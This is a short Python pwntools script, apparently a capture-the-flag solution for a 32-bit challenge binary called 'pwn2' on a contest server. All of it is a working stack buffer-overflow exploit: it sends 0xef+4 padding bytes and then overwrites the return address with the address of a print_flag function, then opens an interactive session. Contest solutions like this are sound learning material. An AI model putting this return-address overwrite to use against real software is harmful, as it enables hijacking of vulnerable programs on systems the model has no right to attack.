from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    print_flag = 0x0804854b
    buf = 'A' * (0xef+4) + p32(print_flag)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc pwn.ctf.tamu.edu 4322'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./pwn2'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
